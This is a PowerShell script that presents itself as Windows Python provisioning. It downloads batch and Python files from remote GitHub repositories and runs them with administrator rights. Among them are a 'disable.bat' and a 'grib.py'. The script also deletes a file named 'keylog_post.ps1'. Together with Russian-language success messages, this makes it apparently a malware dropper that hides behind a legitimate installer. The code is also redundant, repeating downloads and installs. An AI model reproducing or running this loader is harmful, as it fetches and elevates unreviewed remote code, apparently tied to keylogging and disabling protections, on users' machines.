$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/fgape.ps1"
$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
if (Test-Path $fgapeScriptPath) {
    $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
    $installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
    $installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
    $batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat"
    $batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
    $installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
    $installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"

    $batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
    $batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"

    Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
    [System.Windows.Forms.MessageBox]::Show("Install Python bat downloaded")

    Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
    [System.Windows.Forms.MessageBox]::Show("Disable bat downloaded")

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
    [System.Windows.Forms.MessageBox]::Show("Python installation started")

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
    [System.Windows.Forms.MessageBox]::Show("Python installation completed")

    Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
    [System.Windows.Forms.MessageBox]::Show("Python tools bat downloaded")

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
    [System.Windows.Forms.MessageBox]::Show("Python tools installation completed")

    Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
    [System.Windows.Forms.MessageBox]::Show("Install Python bat downloaded")

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
    [System.Windows.Forms.MessageBox]::Show("Python installation completed")

    $keylogScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
    Remove-Item -Path $keylogScriptPath -Force
    [System.Windows.Forms.MessageBox]::Show("Keylog script removed")

    $gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
    $gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
    Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
    [System.Windows.Forms.MessageBox]::Show("Grib script downloaded")

    Start-Process -FilePath "python.exe" -ArgumentList "$gribScriptPath" -Verb RunAs -Wait
    [System.Windows.Forms.MessageBox]::Show("Grib script executed")
    [System.Windows.Forms.MessageBox]::Show("Скрипт fgape.ps1 успешно выполнен.", "Информация")
} else {
    Write-Host "Не удалось загрузить скрипт fgape.ps1."
}
